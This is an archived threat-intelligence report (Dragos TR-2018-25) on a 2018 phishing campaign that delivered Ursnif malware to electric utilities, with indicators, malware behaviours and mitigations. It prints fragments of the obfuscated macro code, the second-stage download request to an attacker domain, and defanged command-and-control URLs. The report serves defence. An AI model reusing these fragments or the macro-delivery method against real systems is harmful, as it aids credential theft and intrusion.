{
    "id": "39f5ad6d-d80d-4506-9d6a-eaed87fbe194",
    "created_at": "2022-10-25T16:48:20.212623Z",
    "updated_at": "2025-03-27T02:12:08.817949Z",
    "deleted_at": null,
    "sha1_hash": "5a1c8bba4adfcf37dc6f74fc728a16440f7ad227",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-05-16T15:25:28Z",
    "file_modification_date": "2019-05-16T15:25:28Z",
    "file_size": 553938,
    "plain_text": "###### g y\n\n\n### THREAT INTELLIGENCE SUMMARY\n#### TR-2018-25: Phishing Campaign Targeting Electric Utility Companies\n\n###### 17 September 2018\n\n\n###### ICS Impact\n\n\n###### Dragos identified a spearphishing campaign targeting multiple electric utility companies and other ICS organizations in North America. The attack attempts to deliver Ursnif malware and was designed to steal credentials and other information. Successful ICS targeting groups like DYMALLOY have leveraged “criminal” malware for initial intrusion operations in ICS organizations, so ICS owners and operators are encouraged to understand how these types of campaigns operate and how to defend against them. \n\n|Threat Analysis|Analyst Assessment|\n|---|---|\n|What is the threat classification?|Spearphishing|\n|What is the risk rating?|Limited threat, risk, or vulnerability requiring an applicability assessment before taking action.|\n|What is the targeted ICS industry vertical?|Electric Utility|\n|Which activity group is involved?|Likely cybercrime|\n|To which stage on the ICS Cyber Kill Chain does this activity correlate?|Stage 1 intrusion phase with to enable pivoting to Stage 2 operations.|\n|How is the malware or attack delivered?|Email|\n|How do you confirm a compromise?|Ursnif behavior includes: Malware install in %AppData% or Temp folders; using “run” keys in host registry to persist through reboots; exfiltration using HTTP POST instead of HTTP GET. Please review report for additional details.|\n|What is the best course of action for remediation?|Antivirus products should flag and quarantine this malware if identified.|\n|What are the mitigations or countermeasures to stop it in the future?|Ensure employees are trained to identify phishing and report to IT when observed; deploy robust MFA; curtail local admin accounts and privileges; monitor for changes to system registry values; log and monitor PowerShell execution; monitor for suspicious HTTP POST activity.|\n|Are IOCs available?|Yes|\n\n\n-----\n\n##### WorldView ICS Threat Intelligence\nCONFIDENTIAL\n\n## TR-2018-25: PHISHING CAMPAIGN TARGETING\n ELECTRIC UTILITY COMPANIES\n\n\n**17 September 2018**\n\n\n**TLP: AMBER For Dragos Customers Only**\n\n\nA limited threat, risk, or vulnerability requiring an applicability assessment before taking action\n\n_This report and its contents may be shared and reused within your organization but may not be redistributed in any manner_\n_elsewhere. Data may be inaccurate and may refer to legitimate but compromised properties. THIS INFORMATION IS_\n_PROVIDED AS-IS FOR INFORMATIONAL PURPOSES ONLY, WITH NO WARRANTY EXPRESSED OR IMPLIED._\n# Executive Summary\n\nDragos identified a phishing campaign starting 30 August 2018 focusing on electric utility companies in North America. The malicious\nemails deliver a malicious document file that attempts to deliver a variant of Ursnif malware. Ursnif is an information stealer,\npreviously observed in credential theft operations targeting financial institutions. Although not ICS focused, Ursnif allows for credential\nharvesting and remote access and can be leveraged as an initial access tool for multiple purposes. Given targeting specificity on electric\nutility operations, Dragos urges caution and advises organizations to monitor for attacks that may appear criminal in nature but which\ncould be utilized by ICS-targeting activity groups for Stage 1 operations in the ICS Cyber Kill Chain.\n# Key Findings\n\n  - A spearphishing campaign targeted multiple electric utilitity companies and some additional ICS organizations with a focus\non North America.\n\n  - The attack contained a weaponized Microsoft Office document which downloads a variant of the Ursnif information stealer.\n\n  - Information stealer malware such as Ursnif can be used to capture information relevant to ICS operations, and thus used as\npart of a Stage 1 ICS Cyber Kill Chain event to enable pivoting to Stage 2 operations.\n\nDragos ICS Threat Intelligence Page 1 Proprietary and Confidential\n\n\n-----\n\n# Contents\n\nExecutive Summary ..................................................................................................................................................................................... 1\nKey Findings ................................................................................................................................................................................................. 1\nBackground .................................................................................................................................................................................................. 2\nPhishing Message ........................................................................................................................................................................................ 2\nMalicious Document .................................................................................................................................................................................... 2\nUrsnif Information Stealer ........................................................................................................................................................................... 4\nIndicators of Compromise ........................................................................................................................................................................... 5\nMitigations ................................................................................................................................................................................................... 5\n\nHost ......................................................................................................................................................................................................... 5\n\nNetwork .................................................................................................................................................................................................. 5\n\nConclusion ................................................................................................................................................................................................... 6\nReferences ................................................................................................................................................................................................... 6\n\n# Background\n\nDragos learned of a phishing campaign targeting several client sites focusing on the electric utility industry on 31 August 2018. Initial\nanalysis did not indicate any links to known activity group tactics, techniques, and procedures (TTPs). Further research identified\nadditional targeting of the electric utility space and related ICS operations. While many aspects of the phishing campaign appeared\n“commodity” in nature, specificity in targeting was sufficient to merit further investigation.\n# Phishing Message\n\nDragos was able to recover an example of the phishing message. The message has the following characteristics:\n```\n    Sender: debbiemccann[AT]gentilinimotors[DOT]com\n    Subject: Re: 2018 Member Involvement Survey\n    Attachment: Don_Schuch_Inquiry.doc\n\n```\nThe message includes information about an energy co-op and, based on victim e-mail information, is designed specifically for the\nrecipient. Other recovered messages follow the same theme, referencing previous messages by starting with “Re:” in the subject line\nand using the “*inquiry.doc” attachment format. Other observed email subjects include references to quotes and invoices, which are\nfairly common phishing practices, but with targeting focused on ICS-related organizations.\n# Malicious Document\n\nThe initial malicious document identified has the following characteristics:\n```\n    MD5: 8b82e654e3bf51311c7db244e7013057\n    SHA1: 3a9876ec9541a7874f757f9b882871dd27ec2c8c\n    SHA256: 71ca05b691c5f42b94c9af35242d95325a571293246415cec9d547a00a9968c7\n\n```\nIn addition to the hash values, the document also included the following interesting metadata indicating a suspicious origin:\n```\n    Title: Nikolaus-Langworth - Inverse dynamic strategy\n    Character_count:1\n    Subject: hauck[.]ca\n    Code_page: Cyrillic\n\n```\nDragos WorldView Page 2 Proprietary and Confidential\n\n\n-----\n\n```\n    LanguageCode: Russian\n    Comments: 386 Daniel River\n    Company: Predovic, Haag and Terry jan.bernier@klockodicki[.]ca\n\n```\nThe domain referenced above, “klockodicki[.]ca”, is not currently hosted and has no associated content. Overall, the document\ncharacteristics indicate an attempt to provide some level of information to make the document appear legitimate (comments,\nsubject, and company items) while also retaining a number of items that draw immediate suspicion (code page, language set, and\ncharacter count).\n\nWhen opened, the document displays a splash screen with a note to enable macros to view content, seen in Figure 1.\n\n_Figure 1: Phishing Document_\n\nExamining the document, it contains highly obfuscated Visual Basic for Applications (VBA) code. The following is an example of the\ncontent:\n```\n    zaieKXowucuziQNibabefapOkYCI = InStr(\"CEzadaZyzoodyLetIpINiw\",\n    \"CEzadaZyzoodyLetIpINiw\")\n    qEhiPANarIDEjEXYjuWUVfOlToqOsorukUwEVosiM = CDate(-729)\n      Application.Run \"FUkUvatAREwYsSeKuBIhWaWaBAZ\",\n    Application.Run(\"iColanonyZEZAkAAPikuTaculEkityroaeGuH\")\n    KYkuXOTAdyFUquWogAhcEcOiajOMEMyMbAMYRO = InStr(\"TIlejuFIPuj\", \"TIlejuFIPuj\")\n    JUiIDoQyraxAXuHLAPYHilyiYgAFaPALAlipUbU = InStr(\"gUqeNiToXIQUsEcEZIByra\",\n    \"gUqeNiToXIQUsEcEZIByra\")\n    rOTUQExuiVOGiDubeDIzyluhEByiEZOaEWY = CDate(-895)\n    FoMUMobIbELUbabOcxiqybuHePvIhUWak = InStr(\"CuTYdOtOANUvEGiCDEQC\",\n    \"CuTYdOtOANUvEGiCDEQC\")\n    Dim HuPoCyPiWeMaCObEbirulAHyMyaIRulVvinEwyhEkYdE\n\n```\nDragos WorldView Page 3 Proprietary and Confidential\n\n\n-----\n\n```\n    HuPoCyPiWeMaCObEbirulAHyMyaIRulVvinEwyhEkYdE = Sgn(5)\n\n```\nWhen macros are enabled, the VBA deobfuscates itself and produces a request for a second-stage object:\n```\n    GET\n    /YUY/index.php?fyyVzu=xtl03g5td&cxfk=0kCPhwIeXg&4aOpJ7kTgV=qEmJcB&FyQe=momo8&OuvKTe\n    J=5P8vD&GBwPewV9=FF&aIXyzTfv=MOn5V8i&KCbCd3t=inKCA&XvG9f=QEDknn6 HTTP/1.1\n    Accept: */*\n    Accept-Encoding: gzip, deflate\n    User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0;\n    SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3)\n    Host: treenosanywork[.]com\n    Connection: Keep-Alive\n\n```\nThe domain has the following characteristics:\n```\n    Registrant Email: <Privacy Protected>\n    Registrar: Key-Systems GmbH\n    Date Created: 30 August 2018\n    IP Address: 81.95.7.10, 185.212.44.246\n    Hosting Provider: Netzbetrieb GmbH (DE), Servinga (DE)\n\n```\nOf note, the following additional domains were also observed hosted on this infrastructure:\n```\n    aosudbqihwbemmnn[.]com \n    nasjduqwneqweasc[.]com \n    sale-fisher.ru\n    chernitagotothea[.]com\n\n```\nDragos was unable to successfully recover the referenced file in the web request above. Further research identified variants of the\nrequest referenced in public data sets and in Dragos client data:\n```\n    hXXp://treenosanywork[.]com/YUY/huonasdh.php?l=momo8.tkn\n    hXXp://treenosanywork[.]com/YUY/index.php\n\n```\nThe URI structure observed – including the “YUY” directory and the “.tkn” extension – are associated with known Ursnif activity,[1]\nan information stealer frequently deployed to gather banking and other financial data.\n# Ursnif Information Stealer\n\nUrsnif first emerged in 2007 to target bank wire transfer systems. [2] Since then, the malware has constantly evolved and has\nbranched out to targeting end users, including harvesting credentials for email, cryptocurrency, websites and taking screenshots.\nAs such, Ursnif represents a fairly robust remote access and data theft tool that can be leveraged for numerous potential usecases.\n\nUrsnif achieves its objectives by injecting itself into other running processes on the infected host.[3] Ursnif is typically the last stage\nin an attack chain beginning with initial access to the victim (such as the phishing campaign identified above) followed by local\ncode execution on the victim machine. Ursnif itself has many variants, rendering IOCs less than helpful to track ever-evolving\ncampaigns. However, an understanding of fundamental behaviors underpinning Ursnif installation and infection events enables\nmore robust defense against this and similar malware types. Examples of typical Ursnif behavior includes:\n\n  - Malware installation in the “%AppData%” or “Temp” folder on victim machines.\n\n1 [Ursnif IOC Feed](https://precisionsec.com/threat-intelligence-feeds/ursnif/) - PrecisionSec\n2 [Ursnif Banking Trojan Spreading](https://threatpost.com/ursnif-banking-trojan-spreading-in-japan/128643/) in Japan - ThreatPost\n3 [Analysis: Ursnif - spying on your](https://www.gdatasoftware.com/blog/2016/11/29325-analysis-ursnif-spying-on-your-data-since-2007) data since 2007 - G-Data\n\nDragos WorldView Page 4 Proprietary and Confidential\n\n\n-----\n\n  - Using “run” keys in the victim host registry to persist through system reboots, such as\n“HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run”\n\n  - Use of domain generation algorithms (DGAs)[4] to produce highly variable, shifting command and control (C2) sites for\ninformation exfiltration and adversary control.\n\n  - Exfiltration using HTTP POST command instead of HTTP GET.\n\nFocusing on the above behaviors, as detailed in the Mitigations section below, will allow defenders to respond to evolving threats\nsuch as this.\n\nWhile Ursnif itself has previously been used primarily as a banking trojan, the malware’s capabilities enable it to be used for data\ntheft and remote access in any target environment. As a result, the targeting in these observed campaigns, focusing on ICS-related\norganizations with ICS-specific themes, is concerning as the tool could be used to facilitate initial intrusion operations as part of\nthe ICS Cyber Kill Chain. While this campaign does not align with any known activity groups, Dragos has previously identified activity\ngroups leveraging “commodity” or “criminal” malware for initial access prior to pivoting to ICS intrusions.[5]\n# Indicators of Compromise\n\nSee attached file.\n# Mitigations\n\n#### Host\n\n  - Apply appropriate group policy (GPOs) or system configuration on Windows hosts to prevent program execution from local\n%AppData% and %Temp% folders.\n\n  - Monitor for changes to system registry values, especially common locations to achieve persistence such as “Run” registry\nkeys, to detect malware attempts to persist through system reboot.\n\n  - Log and monitor PowerShell execution to capture suspicious activity such as download string creation often leveraged by VBA\nto retrieve second-stage infection items.\n\n  - Eliminate or significantly curtail local administrator accounts and privileges to reduce likely impact in the event of an infection.\n\n  - Deploy multi-factor authentication schema for critical systems and services – such as Windows logon, SSH, VPNs, and similar\nservices – to reduce impact of data theft and credential theft attacks.\n\n#### Network\n\n  - Monitor and audit domain resolutions to monitor for potential domain generation algorithm (DGA) activity often used by\nmalware.\n\n  - Deploy network monitoring to detect executable files retrieved from Internet locations and flag items coming from unknown\nor untrusted locations as suspicious for potential further examination. This approach can also be applied to internal traffic to\ndetect payload movement from IT to ICS networks.\n\n  - Monitor for HTTP POST activity without an initiating HTTP GET, frequently used in Ursnif data exfiltration and indicative of\nnon-standard, likely malicious web traffic.\n\n4 [What are Domain Generation Algorithms (DGAs) and Why You Should Care](https://blogs.akamai.com/2017/05/what-are-domain-generation-algorithms-dgas-and-why-you-should-care.html) - Akamai\n5 TR-2017-14 DYMALLOY Malware Review\n\nDragos WorldView Page 5 Proprietary and Confidential\n\n\n-----\n\n# Conclusion\n\nThe identified campaign represents a focused distribution of Ursnif malware to electric utility organizations and some related ICS\nentities. While the malware itself is, at first glance, uninteresting, focused targeting makes this campaign suspicious. Combined with\nUrsnif’s capability to function as a flexible remote access and data theft tool, campaigns such as the one detailed above can be used\nby more sophisticated activity groups to mask an initial intrusion event while gathering data on the target network.\n\nAt this time, Dragos possesses no specific information indicating that the exact campaign resulting in this report is an initial intrusion\nevent leading to potential ICS attacks. However, given that successful ICS targeting groups such as DYMALLOY have leveraged\n“criminal” malware for initial intrusion operations in ICS organizations, ICS owners and operators are strongly encouraged to\nunderstand how campaigns such as this operate and what steps to take to defend against future such attacks. Adopting this behaviorbased approach to seemingly commodity attacks will enable defenders to better respond to and mitigate potential future operations.\n# References\n\n\n**References:**\n\n\n\n     - [TR-2017-14 DYMALLOY Malware Review](https://intel.dragos.com/products/TR-2017-14/report)\n\n     - [Ursnif IOC Feed – PrecisionSec](https://precisionsec.com/threat-intelligence-feeds/ursnif/)\n\n     - [Ursnif Banking Trojan Spreading in Japan - ThreatPost](https://threatpost.com/ursnif-banking-trojan-spreading-in-japan/128643/)\n\n     - [Analysis: Ursnif - spying on your data since 2007 - G-Data](https://www.gdatasoftware.com/blog/2016/11/29325-analysis-ursnif-spying-on-your-data-since-2007)\n\n     - [What are Domain Generation Algorithms (DGAs) and Why You Should Care -](https://blogs.akamai.com/2017/05/what-are-domain-generation-algorithms-dgas-and-why-you-should-care.html)\nAkamai\n\n**Tags:** Ursnif, Malware, Phishing, Electric Distribution, Electric Generation\n\nDragos WorldView Page 6 Proprietary and Confidential\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://dragos.com/wp-content/uploads/Sample-WorldView-Report.pdf"
    ],
    "report_names": [
        "Sample-WorldView-Report.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e2a4bc0b-6745-4e55-9d7c-3d169d70b025",
            "created_at": "2022-10-25T16:07:23.386907Z",
            "updated_at": "2025-03-27T02:02:09.774331Z",
            "deleted_at": null,
            "main_name": "Berserk Bear",
            "aliases": [
                "Berserk Bear",
                "Dragonfly 2.0",
                "Dymalloy"
            ],
            "source_name": "ETDA:Berserk Bear",
            "tools": [
                "Fuerboos",
                "Goodor",
                "Impacket",
                "Karagany",
                "Karagny",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Phishery",
                "Trojan.Karagany",
                "Trojan.Phisherly",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "90307967-d5eb-4b7b-b8de-6fa2089a176e",
            "created_at": "2022-10-25T15:50:23.501119Z",
            "updated_at": "2025-03-27T02:00:55.486295Z",
            "deleted_at": null,
            "main_name": "Dragonfly 2.0",
            "aliases": [
                "Dragonfly 2.0",
                "IRON LIBERTY",
                "DYMALLOY",
                "Berserk Bear"
            ],
            "source_name": "MITRE:Dragonfly 2.0",
            "tools": [
                "netsh",
                "Impacket",
                "MCMD",
                "CrackMapExec",
                "Trojan.Karagany",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041528,
    "ts_creation_date": 1558020328,
    "ts_modification_date": 1558020328,
    "files": {
        "pdf": "https://archive.orkl.eu/5a1c8bba4adfcf37dc6f74fc728a16440f7ad227.pdf",
        "text": "https://archive.orkl.eu/5a1c8bba4adfcf37dc6f74fc728a16440f7ad227.txt",
        "img": "https://archive.orkl.eu/5a1c8bba4adfcf37dc6f74fc728a16440f7ad227.jpg"
    }
}